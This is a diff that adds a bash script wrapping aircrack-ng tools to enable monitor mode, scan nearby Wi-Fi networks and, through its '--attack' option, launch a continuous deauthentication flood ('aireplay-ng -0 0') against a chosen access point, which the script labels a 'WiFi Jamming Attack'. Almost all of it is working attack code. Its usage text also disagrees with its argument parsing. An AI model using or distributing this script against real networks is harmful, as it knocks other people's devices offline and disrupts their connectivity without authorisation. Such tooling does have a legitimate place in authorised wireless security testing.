@@ -1,0 +1,113 @@
+#!/bin/bash
+
+# Check for root privileges
+if [[ $EUID -ne 0 ]]; then
+   echo "This script must be run as root"
+   exit 1
+fi
+
+# Interface Finder
+interface=$(iw dev | awk '$1=="Interface"{print $2}')
+
+# Function to start monitor mode
+start_monitor() {
+    if iwconfig "$interface" | grep "Mode:Monitor" > /dev/null; then
+        echo "Monitor mode is already enabled on $interface"
+    else
+        echo "Enabling monitor mode on $interface..."
+        airmon-ng start "$interface" > /dev/null 2>&1
+        echo "Monitor mode enabled on $interface."
+    fi
+}
+
+# Function to stop monitor mode
+stop_monitor() {
+    if iwconfig "$interface" | grep "Mode:Managed" > /dev/null; then
+        echo "Monitor mode is already disabled on $interface"
+    else
+        interface=$(iw dev | awk '$1=="Interface"{print $2}')
+        echo "Disabling monitor mode on $interface..."
+        airmon-ng stop "$interface" > /dev/null 2>&1
+        echo "Monitor mode disabled on $interface."
+    fi
+}
+
+# Function to show WiFi networks using airodump-ng
+show_networks() {
+    interface=$(iw dev | awk '$1=="Interface"{print $2}')
+    echo "Scanning for WiFi networks on $interface..."
+    airodump-ng "$interface"
+}
+
+show_indivisual_networks() {
+    interface=$(iw dev | awk '$1=="Interface"{print $2}')
+    echo "Scanning for WiFi network on $interface..."
+    airodump-ng "$interface" --bssid "$1" --channel "$2"
+}
+
+perform_attack() {
+    echo "Attack is going to start..."
+    sleep 2
+    echo "To stop attack press Ctrl+c"
+    aireplay-ng "$interface" -0 0 -a "$1" &
+    # Define the loading animation
+    animation="/-\|"
+    index=0
+
+    # Check if aireplay-ng is still running
+    while ps -p $! >/dev/null; do
+        echo -ne "\r[ ${animation:index++%${#animation}:1} ] Running WiFi Jamming Attack..."
+    done
+}
+
+# Check command-line arguments
+case "$1" in
+    --monitor)
+        case "$2" in
+            start)
+                start_monitor
+                ;;
+            stop)
+                stop_monitor
+                ;;
+            *)
+                echo "Unknown argument for -monitor: $2"
+                exit 1
+                ;;
+        esac
+        ;;
+    --status)
+        show_networks
+        ;;
+    --bssid)
+        case "$3" in
+            --channel)
+                    show_indivisual_networks "$2" "$4"
+                    ;;
+        esac
+        ;;
+    --attack)
+        case "$2" in
+            --bssid)
+                    perform_attack "$3"
+                    ;;
+            *)
+                echo "wifi --attack --bssid <bssid_name>"
+                exit 1
+                ;;
+        esac
+        ;;
+    *)
+        echo "Usage: wifi --monitor start"
+        echo "       wifi --monitor stop"
+        echo "       wifi --status"
+        echo "       wifi --status --bssid <bssid_name> --channel <channel_number>"
+        echo "       wifi --attack --bssid <bssid_name>"
+        exit 1
+        ;;
+esac
+
+# Print the new interface name if it's set
+if [ -n "$new_interface" ]; then
+    echo "New interface name for monitor mode: $new_interface"
+fi
